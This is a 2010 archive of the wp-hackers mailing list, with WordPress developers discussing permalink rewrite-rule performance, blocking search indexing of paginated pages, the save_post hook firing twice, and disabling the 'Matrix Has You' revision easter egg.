>> According to http://codex.wordpress.org/Using_Permalinks
>>
>> Permalinks for posts should start with some sort of number.
>>
>> "For performance reasons, it is *not* a good idea to start your permalink
>> structure with the category, tag, author, or postname fields. The reason is
>> that these are text fields, and using them at the beginning of your
>> permalink structure it takes more time for WordPress to distinguish your
>> Post URLs from Page URLs (which always use the text "page slug" as the URL),
>> and to compensate, WordPress stores a lot of extra information in its
>> database (so much that sites with lots of Pages have experienced
>> difficulties). So, it is best to start your permalink structure with a
>> numeric field, such as the year or post ID."
>>
>> Now my question is this, I would like to have my permalinks for posts look
>> like this: ? mysite.tld/blog/%postname%
>>
>> Does anyone know if this will cause any performance issues since they start
>> with a static string?
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From rbilesky at gmail.com  Thu Oct 21 19:39:54 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Thu, 21 Oct 2010 12:39:54 -0700
Subject: [wp-hackers] Permalink Performance
In-Reply-To: <AANLkTik2Z_HKBQJhkoRDPC_-qFAufGZ-pxyJRxe_rdfS@mail.gmail.com>
References: <AANLkTi=8mGe=27ftFpb-d9pC+as9zvvAh6sJ0OQ0AxPB@mail.gmail.com>
	<AANLkTimhTX=W+=MkrpVzcRL8ojNVXL1emGyHpJTYf=zj@mail.gmail.com>
	<AANLkTik2Z_HKBQJhkoRDPC_-qFAufGZ-pxyJRxe_rdfS@mail.gmail.com>
Message-ID: <AANLkTinShUshti6kXpsU=97gBZg9N35BZLTByy1oDxU-@mail.gmail.com>

I thought that it should still work, thanks for confirming that.  I did
create a tarc ticket http://core.trac.wordpress.org/ticket/15187 because I
think the issue is probably that wordpress detects if the permalink starts
with a numeric value (like %year%) and if it does not just assumes to force
verbose page rules.
On Thu, Oct 21, 2010 at 12:27 PM, Otto <otto at ottodestruct.com> wrote:

> Looking at the code, I see that I have been mistaken on this point for
> some time now. Static strings at the front of the permalink string do
> not disable verbose page rules. Although I don't know why it's doing
> that, since static strings should be fine to avoid the problem.
>
> I'll have to investigate the rewrite system some more.
>
> -Otto
>
>
>
> On Thu, Oct 21, 2010 at 2:16 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
> > I made an interesting discovery today, I use a permalink of
> /blog/%postname%
> >
> > Now while having another rewrite rules issue I install this plugin (
> > http://wordpress.org/extend/plugins/askapaches-rewriterules-viewer/)
> > according to it, my blog is using verbose page rewrite rules.
> >
> > Now performance wise this isn;t much of an issue as I won;t have
> probabbly
> > more than 50 pages or so, but this is causing another issue when I modify
> > the sql queries of one blog to pull posts, pages, and comments from
> another
> > blog on my multisite install.  see my other recent email about my
> subdomin
> > probllems with multisite.  I am using the query filter to change
> wp_#_table
> > to wp_table and everything works find, except pages, unless I copy the
> pages
> > to that sites table to create the rewrite rules.
> >
> > Anyway just though I'd update this with my findings about using a static
> > string to start post permalinks.
> >
> > On Thu, Sep 2, 2010 at 10:45 AM, Ryan Bilesky <rbilesky at gmail.com>
> wrote:
> >
> >> According to http://codex.wordpress.org/Using_Permalinks
> >>
> >> Permalinks for posts should start with some sort of number.
> >>
> >> "For performance reasons, it is *not* a good idea to start your
> permalink
> >> structure with the category, tag, author, or postname fields. The reason
> is
> >> that these are text fields, and using them at the beginning of your
> >> permalink structure it takes more time for WordPress to distinguish your
> >> Post URLs from Page URLs (which always use the text "page slug" as the
> URL),
> >> and to compensate, WordPress stores a lot of extra information in its
> >> database (so much that sites with lots of Pages have experienced
> >> difficulties). So, it is best to start your permalink structure with a
> >> numeric field, such as the year or post ID."
> >>
> >> Now my question is this, I would like to have my permalinks for posts
> look
> >> like this:   mysite.tld/blog/%postname%
> >>
> >> Does anyone know if this will cause any performance issues since they
> start
> >> with a static string?
> >>
>  > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From nanobar at gmail.com  Thu Oct 21 22:02:28 2010
From: nanobar at gmail.com (Lance Willett)
Date: Thu, 21 Oct 2010 15:02:28 -0700
Subject: [wp-hackers] Programmatic Widget Handling
In-Reply-To: <D334FDC4-674F-4CB6-A241-761760603DE9@medienhaus.at>
References: <D334FDC4-674F-4CB6-A241-761760603DE9@medienhaus.at>
Message-ID: <AANLkTimSoQY-AVsxktMDMQCs6RZe8Qk-rLXzhrGAyM3L@mail.gmail.com>

> I'm currently working on an extension to the widget's functionality to allow users of the site to create virtually unlimited amounts of new sidebars, filter them and add widgets to them.

Might be worth looking at the Widget Profiles plugin:
http://wordpress.org/extend/plugins/widget-profiles/

It's two years old but has the same basic principle in mind.

From richzenmaster at gmail.com  Fri Oct 22 05:32:41 2010
From: richzenmaster at gmail.com (Rich ZenMaster)
Date: Thu, 21 Oct 2010 22:32:41 -0700
Subject: [wp-hackers] prevent indexing of page 2,3 and so on
Message-ID: <AANLkTi=bQkVZFga7wN0aps4EmP+iMrXhDfe9LZq-2hpg@mail.gmail.com>

Do you know how to prevent indexing of pages past the home page in WP?
I mean I don't want mysite.com/page/2, mysite.com/page/3 to be indexed.

This is because I use home.php for my theme, so that page/2, page/3
are all the same.

Please give me a hint or a code snippet please, I don't want to add another
plugin (robots meta).

From hempsworth at gmail.com  Fri Oct 22 06:30:42 2010
From: hempsworth at gmail.com (Alex Hempton-Smith)
Date: Fri, 22 Oct 2010 08:30:42 +0200
Subject: [wp-hackers] prevent indexing of page 2,3 and so on
In-Reply-To: <AANLkTi=bQkVZFga7wN0aps4EmP+iMrXhDfe9LZq-2hpg@mail.gmail.com>
References: <AANLkTi=bQkVZFga7wN0aps4EmP+iMrXhDfe9LZq-2hpg@mail.gmail.com>
Message-ID: <AANLkTikFzUqv714nxuxbxdGNFFX8hmgHmKNd1YbwmSbn@mail.gmail.com>

Just hook into the <head> with wp_head, and use a conditional statement in
that function:

function my_plugin_head() {
    if ( !is_home() )
        echo '<meta name="robots" content="noindex, nofollow">';
}
add_action('wp_head', 'my_plugin_head');

Untested, but should work.

-- Alex


On Fri, Oct 22, 2010 at 7:32 AM, Rich ZenMaster <richzenmaster at gmail.com>wrote:

> Do you know how to prevent indexing of pages past the home page in WP?
> I mean I don't want mysite.com/page/2, mysite.com/page/3 to be indexed.
>
> This is because I use home.php for my theme, so that page/2, page/3
> are all the same.
>
> Please give me a hint or a code snippet please, I don't want to add another
> plugin (robots meta).
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From richzenmaster at gmail.com  Fri Oct 22 06:49:05 2010
From: richzenmaster at gmail.com (Rich ZenMaster)
Date: Thu, 21 Oct 2010 23:49:05 -0700
Subject: [wp-hackers] prevent indexing of page 2,3 and so on
In-Reply-To: <AANLkTikFzUqv714nxuxbxdGNFFX8hmgHmKNd1YbwmSbn@mail.gmail.com>
References: <AANLkTi=bQkVZFga7wN0aps4EmP+iMrXhDfe9LZq-2hpg@mail.gmail.com>
	<AANLkTikFzUqv714nxuxbxdGNFFX8hmgHmKNd1YbwmSbn@mail.gmail.com>
Message-ID: <AANLkTinSP5cNqOEaTGyg5XSHSdGhQ-rb8PwDEW5G281C@mail.gmail.com>

@alex,

This will probably prevent indexing of everything except homepage.

On Thu, Oct 21, 2010 at 11:30 PM, Alex Hempton-Smith
<hempsworth at gmail.com>wrote:

> Just hook into the <head> with wp_head, and use a conditional statement in
> that function:
>
> function my_plugin_head() {
>    if ( !is_home() )
>        echo '<meta name="robots" content="noindex, nofollow">';
> }
> add_action('wp_head', 'my_plugin_head');
>
> Untested, but should work.
>
> -- Alex
>
>
> On Fri, Oct 22, 2010 at 7:32 AM, Rich ZenMaster <richzenmaster at gmail.com
> >wrote:
>
> > Do you know how to prevent indexing of pages past the home page in WP?
> > I mean I don't want mysite.com/page/2, mysite.com/page/3 to be indexed.
> >
> > This is because I use home.php for my theme, so that page/2, page/3
> > are all the same.
> >
> > Please give me a hint or a code snippet please, I don't want to add
> another
> > plugin (robots meta).
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From johnbillion+wp at gmail.com  Fri Oct 22 07:08:24 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Fri, 22 Oct 2010 08:08:24 +0100
Subject: [wp-hackers] prevent indexing of page 2,3 and so on
In-Reply-To: <AANLkTinSP5cNqOEaTGyg5XSHSdGhQ-rb8PwDEW5G281C@mail.gmail.com>
References: <AANLkTi=bQkVZFga7wN0aps4EmP+iMrXhDfe9LZq-2hpg@mail.gmail.com>
	<AANLkTikFzUqv714nxuxbxdGNFFX8hmgHmKNd1YbwmSbn@mail.gmail.com>
	<AANLkTinSP5cNqOEaTGyg5XSHSdGhQ-rb8PwDEW5G281C@mail.gmail.com>
Message-ID: <AANLkTik9zxdG6F+5J-F+YisZvxUMgk_JwT7vKAD8i12x@mail.gmail.com>

On Fri, Oct 22, 2010 at 7:49 AM, Rich ZenMaster <richzenmaster at gmail.com> wrote:
> @alex,
>
> This will probably prevent indexing of everything except homepage.

You'll want the is_paged() conditional in that case.

From rbilesky at gmail.com  Fri Oct 22 08:38:00 2010
From: rbilesky at gmail.com (Ryan Bilesky)
Date: Fri, 22 Oct 2010 01:38:00 -0700
Subject: [wp-hackers] Permalink Performance
In-Reply-To: <AANLkTinShUshti6kXpsU=97gBZg9N35BZLTByy1oDxU-@mail.gmail.com>
References: <AANLkTi=8mGe=27ftFpb-d9pC+as9zvvAh6sJ0OQ0AxPB@mail.gmail.com>
	<AANLkTimhTX=W+=MkrpVzcRL8ojNVXL1emGyHpJTYf=zj@mail.gmail.com>
	<AANLkTik2Z_HKBQJhkoRDPC_-qFAufGZ-pxyJRxe_rdfS@mail.gmail.com>
	<AANLkTinShUshti6kXpsU=97gBZg9N35BZLTByy1oDxU-@mail.gmail.com>
Message-ID: <AANLkTin4ibHZN42+2ENqTHj3XSAKXW0=UOryht-PMa3J@mail.gmail.com>

/blog/%postname% causes verbose page rules, /blog/%year%/%postname% does
not.  It appears to be ignoring the static string and just looks at the
first wildcard.

I do believe I found the code responsible for this in
wp-includes/rewrite.php on line 1984.

if ( preg_match("/^[^%]*%(?:postname|category|tag|author)%/",
$this->permalink_structure) )

I believe if this code were changed to

if ( preg_match("\A/%(?:postname|category|tag|author)%/",
$this->permalink_structure) )

that should work.  Can someone double check my regular expression and make
sure I got this right though.
On Thu, Oct 21, 2010 at 12:39 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> I thought that it should still work, thanks for confirming that.  I did
> create a tarc ticket http://core.trac.wordpress.org/ticket/15187 because I
> think the issue is probably that wordpress detects if the permalink starts
> with a numeric value (like %year%) and if it does not just assumes to force
> verbose page rules.
>   On Thu, Oct 21, 2010 at 12:27 PM, Otto <otto at ottodestruct.com> wrote:
>
>> Looking at the code, I see that I have been mistaken on this point for
>> some time now. Static strings at the front of the permalink string do
>> not disable verbose page rules. Although I don't know why it's doing
>> that, since static strings should be fine to avoid the problem.
>>
>> I'll have to investigate the rewrite system some more.
>>
>> -Otto
>>
>>
>>
>> On Thu, Oct 21, 2010 at 2:16 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
>> > I made an interesting discovery today, I use a permalink of
>> /blog/%postname%
>> >
>> > Now while having another rewrite rules issue I install this plugin (
>> > http://wordpress.org/extend/plugins/askapaches-rewriterules-viewer/)
>> > according to it, my blog is using verbose page rewrite rules.
>> >
>> > Now performance wise this isn;t much of an issue as I won;t have
>> probabbly
>> > more than 50 pages or so, but this is causing another issue when I
>> modify
>> > the sql queries of one blog to pull posts, pages, and comments from
>> another
>> > blog on my multisite install.  see my other recent email about my
>> subdomin
>> > probllems with multisite.  I am using the query filter to change
>> wp_#_table
>> > to wp_table and everything works find, except pages, unless I copy the
>> pages
>> > to that sites table to create the rewrite rules.
>> >
>> > Anyway just though I'd update this with my findings about using a static
>> > string to start post permalinks.
>> >
>> > On Thu, Sep 2, 2010 at 10:45 AM, Ryan Bilesky <rbilesky at gmail.com>
>> wrote:
>> >
>> >> According to http://codex.wordpress.org/Using_Permalinks
>> >>
>> >> Permalinks for posts should start with some sort of number.
>> >>
>> >> "For performance reasons, it is *not* a good idea to start your
>> permalink
>> >> structure with the category, tag, author, or postname fields. The
>> reason is
>> >> that these are text fields, and using them at the beginning of your
>> >> permalink structure it takes more time for WordPress to distinguish
>> your
>> >> Post URLs from Page URLs (which always use the text "page slug" as the
>> URL),
>> >> and to compensate, WordPress stores a lot of extra information in its
>> >> database (so much that sites with lots of Pages have experienced
>> >> difficulties). So, it is best to start your permalink structure with a
>> >> numeric field, such as the year or post ID."
>> >>
>> >> Now my question is this, I would like to have my permalinks for posts
>> look
>> >> like this:   mysite.tld/blog/%postname%
>> >>
>> >> Does anyone know if this will cause any performance issues since they
>> start
>> >> with a static string?
>> >>
>>  > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>

From mail at scribu.net  Fri Oct 22 09:33:22 2010
From: mail at scribu.net (scribu)
Date: Fri, 22 Oct 2010 12:33:22 +0300
Subject: [wp-hackers] Permalink Performance
In-Reply-To: <AANLkTin4ibHZN42+2ENqTHj3XSAKXW0=UOryht-PMa3J@mail.gmail.com>
References: <AANLkTi=8mGe=27ftFpb-d9pC+as9zvvAh6sJ0OQ0AxPB@mail.gmail.com>
	<AANLkTimhTX=W+=MkrpVzcRL8ojNVXL1emGyHpJTYf=zj@mail.gmail.com>
	<AANLkTik2Z_HKBQJhkoRDPC_-qFAufGZ-pxyJRxe_rdfS@mail.gmail.com>
	<AANLkTinShUshti6kXpsU=97gBZg9N35BZLTByy1oDxU-@mail.gmail.com>
	<AANLkTin4ibHZN42+2ENqTHj3XSAKXW0=UOryht-PMa3J@mail.gmail.com>
Message-ID: <AANLkTimv0hVOzkjTBZa4_x+=xS=iWtS27yOd0maHsE4-@mail.gmail.com>

On Fri, Oct 22, 2010 at 11:38 AM, Ryan Bilesky <rbilesky at gmail.com> wrote:

> if ( preg_match("\A/%(?:postname|category|tag|author)%/",
> $this->permalink_structure) )
>

You have to have a delimiter, preferably something different from '/' in
this case:

if ( preg_match("#\A/%(?:postname|category|tag|author)%#",
$this->permalink_structure) )

From sbressler at gmail.com  Fri Oct 22 10:28:38 2010
From: sbressler at gmail.com (Scott Bressler)
Date: Fri, 22 Oct 2010 03:28:38 -0700
Subject: [wp-hackers] save_post action done twice
Message-ID: <AANLkTikHzMoMPtUwX7vRXMntUPR3cyPRcNrsYCWUmZBU@mail.gmail.com>

It seems that in hooking into the save_post action for saving the data in a
custom meta-box, my callback is being called twice when either saving a
draft post or updating a published post. If I instead hook into edit_post,
my callback is only called once.

Is this "double-calling" behavior with save_post expected? Should I be
hooking into edit_post instead?

Thanks,
Scott

From mail at scribu.net  Fri Oct 22 10:50:05 2010
From: mail at scribu.net (scribu)
Date: Fri, 22 Oct 2010 13:50:05 +0300
Subject: [wp-hackers] save_post action done twice
In-Reply-To: <AANLkTikHzMoMPtUwX7vRXMntUPR3cyPRcNrsYCWUmZBU@mail.gmail.com>
References: <AANLkTikHzMoMPtUwX7vRXMntUPR3cyPRcNrsYCWUmZBU@mail.gmail.com>
Message-ID: <AANLkTim5BMNnw=SP-RaPVYo-yuSME-0tNu17CtWzbjjG@mail.gmail.com>

On Fri, Oct 22, 2010 at 1:28 PM, Scott Bressler <sbressler at gmail.com> wrote:

> It seems that in hooking into the save_post action for saving the data in a
> custom meta-box, my callback is being called twice when either saving a
> draft post or updating a published post. If I instead hook into edit_post,
> my callback is only called once.
>
> Is this "double-calling" behavior with save_post expected? Should I be
> hooking into edit_post instead?
>

Yes, it's expected. You should be checking the post_type at the beginning of
your callback.

From info at bluechives.com  Fri Oct 22 10:51:57 2010
From: info at bluechives.com (Blue Chives)
Date: Fri, 22 Oct 2010 11:51:57 +0100
Subject: [wp-hackers] prevent indexing of page 2,3 and so on
Message-ID: <E92E0A4C-9038-477D-A33A-7BBDD0B55B1F@bluechives.com>

Hi Rich,

Rather then a plug in you could use the robots.txt file such as

User-agent: *
Disallow: /page/*
Allow: /page/1

If you wanted the pages to not appear in the google index then use the noindex directive instead/as well as the disallow directive.


Cheers


On 22 Oct 2010, at 06:32, Rich ZenMaster <richzenmaster at gmail.com> wrote:

> Do you know how to prevent indexing of pages past the home page in WP?
> I mean I don't want mysite.com/page/2, mysite.com/page/3 to be indexed.
> 
> This is because I use home.php for my theme, so that page/2, page/3
> are all the same.
> 
> Please give me a hint or a code snippet please, I don't want to add another
> plugin (robots meta).
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From sbressler at gmail.com  Fri Oct 22 10:52:40 2010
From: sbressler at gmail.com (Scott Bressler)
Date: Fri, 22 Oct 2010 03:52:40 -0700
Subject: [wp-hackers] save_post action done twice
In-Reply-To: <AANLkTim5BMNnw=SP-RaPVYo-yuSME-0tNu17CtWzbjjG@mail.gmail.com>
References: <AANLkTikHzMoMPtUwX7vRXMntUPR3cyPRcNrsYCWUmZBU@mail.gmail.com>
	<AANLkTim5BMNnw=SP-RaPVYo-yuSME-0tNu17CtWzbjjG@mail.gmail.com>
Message-ID: <AANLkTin0WcAo=osf-Fi9Na_pmwgcWwV8c8dDS2Dz9qx4@mail.gmail.com>

Ah, I see, one is a of type 'revision' and the other of type 'post'. Thanks!

Is save_post better than edit_post? What cases would edit_post miss?

On Fri, Oct 22, 2010 at 3:50 AM, scribu <mail at scribu.net> wrote:

> On Fri, Oct 22, 2010 at 1:28 PM, Scott Bressler <sbressler at gmail.com>
> wrote:
>
> > It seems that in hooking into the save_post action for saving the data in
> a
> > custom meta-box, my callback is being called twice when either saving a
> > draft post or updating a published post. If I instead hook into
> edit_post,
> > my callback is only called once.
> >
> > Is this "double-calling" behavior with save_post expected? Should I be
> > hooking into edit_post instead?
> >
>
> Yes, it's expected. You should be checking the post_type at the beginning
> of
> your callback.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mail at scribu.net  Fri Oct 22 12:16:09 2010
From: mail at scribu.net (scribu)
Date: Fri, 22 Oct 2010 15:16:09 +0300
Subject: [wp-hackers] save_post action done twice
In-Reply-To: <AANLkTin0WcAo=osf-Fi9Na_pmwgcWwV8c8dDS2Dz9qx4@mail.gmail.com>
References: <AANLkTikHzMoMPtUwX7vRXMntUPR3cyPRcNrsYCWUmZBU@mail.gmail.com>
	<AANLkTim5BMNnw=SP-RaPVYo-yuSME-0tNu17CtWzbjjG@mail.gmail.com>
	<AANLkTin0WcAo=osf-Fi9Na_pmwgcWwV8c8dDS2Dz9qx4@mail.gmail.com>
Message-ID: <AANLkTinssV1JUrPH0u+PqtFzaE8rZ_SE-t2WS5HTD1bt@mail.gmail.com>

On Fri, Oct 22, 2010 at 1:52 PM, Scott Bressler <sbressler at gmail.com> wrote:

> Is save_post better than edit_post? What cases would edit_post miss?
>


From eric at eam.me  Fri Oct 22 14:29:58 2010
From: eric at eam.me (Eric Mann)
Date: Fri, 22 Oct 2010 07:29:58 -0700
Subject: [wp-hackers] "The Matrix Has You" easter egg
Message-ID: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>

When I first learned of the post revision self-comparison "feature" I was
very entertained.  It was fun, relatively unintrusive, and I didn't think it
would ever be a problem.

Last night, though ... it did cause a problem.

I have a client who *thinks* they're tech-savvy.  Unfortunately, they're not
and concepts like easter eggs in software are completely lost on them.  Last
night, they were trying to edit a post that had an embedded video tag.  I'd
gotten the post working, and they broke something ... so they tried using
the post revision feature to figure out what they'd changed.  The first
thing they did was compare one revision against itself and, boom, they
thought their site had been hacked, deleted, and destroyed.

After several frantic emails and voicemails I got them to calm down and
explained that it was a hidden surprise and their site was perfectly safe.
 Then I fixed the embed tag, removed revisions for that post, and asked them
to just call me the next time a post broke.

As entertaining as the feature might be ... is there any way I can turn it
off on a client site?  I have a custom drop-in plug-in I use on all my
client sites that I can add some script to; I just think preemptively
removing a feature that could cause confusion among the non tech-savvy would
be easier than explaining why it's funny after a mild meltdown.  I doubt I'd
remove it for the vast majority of my clients (everyone else so far has
found it hilarious), but there will always be a few I'd like to "shelter"
just to be safe.

~Eric

From austin at ilfilosofo.com  Fri Oct 22 14:37:00 2010
From: austin at ilfilosofo.com (Austin Matzko)
Date: Fri, 22 Oct 2010 09:37:00 -0500
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
Message-ID: <AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>

On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me> wrote:
> As entertaining as the feature might be ... is there any way I can turn it
> off on a client site?

I proposed a patch here to allow it to be turned off by filter, but
the ticket never went anywhere:

<http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisions-filter.12816.2.diff>

From arlenbee at gmail.com  Fri Oct 22 14:42:18 2010
From: arlenbee at gmail.com (Arlen Beiler)
Date: Fri, 22 Oct 2010 10:42:18 -0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
	<AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
Message-ID: <AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>

How many easter eggs are there. And I would recommend a setting in
wp-config.php, rather than a plugin.

On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko <austin at ilfilosofo.com>wrote:

> On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me> wrote:
> > As entertaining as the feature might be ... is there any way I can turn
> it
> > off on a client site?
>
> I proposed a patch here to allow it to be turned off by filter, but
> the ticket never went anywhere:
>
> <
> http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisions-filter.12816.2.diff
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From Gavin.Pearce at 3seven9.com  Fri Oct 22 14:46:44 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Fri, 22 Oct 2010 15:46:44 +0100
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com><AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
	<AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E3791@tbs-sbs01.TBS.local>

+1

controversy warning: include the new(ish) Wordpress to WordPress
conversion as part of this option?

G

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Arlen
Beiler
Sent: 22 October 2010 15:42
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] "The Matrix Has You" easter egg

How many easter eggs are there. And I would recommend a setting in
wp-config.php, rather than a plugin.

On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko
<austin at ilfilosofo.com>wrote:

> On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me> wrote:
> > As entertaining as the feature might be ... is there any way I can
turn
> it
> > off on a client site?
>
> I proposed a patch here to allow it to be turned off by filter, but
> the ticket never went anywhere:
>
> <
>
http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisi
ons-filter.12816.2.diff
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From emoya at tribune.com  Fri Oct 22 14:48:24 2010
From: emoya at tribune.com (Moya, Eddie)
Date: Fri, 22 Oct 2010 09:48:24 -0500
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
Message-ID: <C8E70E68.CFC8%emoya@tribune.com>

It seems irresponsible that "cute" things like these are built into wordpress, and are turned on be default. I don't want to hash out that old debate though. I camel-case P debate is too fresh in my mind.

It seems only reasonable that there be a core plugin that removes all these - rather unprofessional looking - easter eggs. That is, in lieu of having them turned off by default and optionally turned on.

As Alren suggests, a wp-config.php setting would work just as fine - although I think a core-plugin might be more easily accessible by the types who get confused by these easter-eggs to begin with.

--
Eddie Moya
Applications Developer
Tribune Technology


On 10/22/10 9:42 AM, "Arlen Beiler" <arlenbee at gmail.com> wrote:

How many easter eggs are there. And I would recommend a setting in
wp-config.php, rather than a plugin.

On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko <austin at ilfilosofo.com>wrote:

> On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me> wrote:
> > As entertaining as the feature might be ... is there any way I can turn
> it
> > off on a client site?
>
> I proposed a patch here to allow it to be turned off by filter, but
> the ticket never went anywhere:
>
> <
> http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisions-filter.12816.2.diff
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



From peter.westwood at ftwr.co.uk  Fri Oct 22 14:50:30 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri, 22 Oct 2010 15:50:30 +0100
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
	<AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
Message-ID: <E21373B3-2B0F-4265-8798-48E276055DED@ftwr.co.uk>


On 22 Oct 2010, at 15:37, Austin Matzko wrote:

> On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me> wrote:
>> As entertaining as the feature might be ... is there any way I can turn it
>> off on a client site?
> 
> I proposed a patch here to allow it to be turned off by filter, but
> the ticket never went anywhere:
> 
> <http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisions-filter.12816.2.diff>
> 

Whats missing in the patch to use the scriptloader and unobsfucate the code.

Thats what that ticket really wants.

Of course the patch for that could also make it easier to turn this off

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From otto at ottodestruct.com  Fri Oct 22 14:54:14 2010
From: otto at ottodestruct.com (Otto)
Date: Fri, 22 Oct 2010 09:54:14 -0500
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
Message-ID: <AANLkTimynOJUWj+Jyn4Oc9=92a-L2eT+vup53oSLO+kZ@mail.gmail.com>

On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me> wrote:
> As entertaining as the feature might be ... is there any way I can turn it
> off on a client site? ?I have a custom drop-in plug-in I use on all my
> client sites that I can add some script to; I just think preemptively
> removing a feature that could cause confusion among the non tech-savvy would
> be easier than explaining why it's funny after a mild meltdown. ?I doubt I'd
> remove it for the vast majority of my clients (everyone else so far has
> found it hilarious), but there will always be a few I'd like to "shelter"
> just to be safe.

You should be able to hook to "admin_action_diff" and thus intercept
the revision comparison action before it happens. If $_POST['left'] ==
$_POST['right'], then it's getting ready to show the easter egg. To
stop it from happening, change one of the left or right's to a
different number.

-Otto

From eric at eam.me  Fri Oct 22 14:56:00 2010
From: eric at eam.me (Eric Mann)
Date: Fri, 22 Oct 2010 07:56:00 -0700
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
	<AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
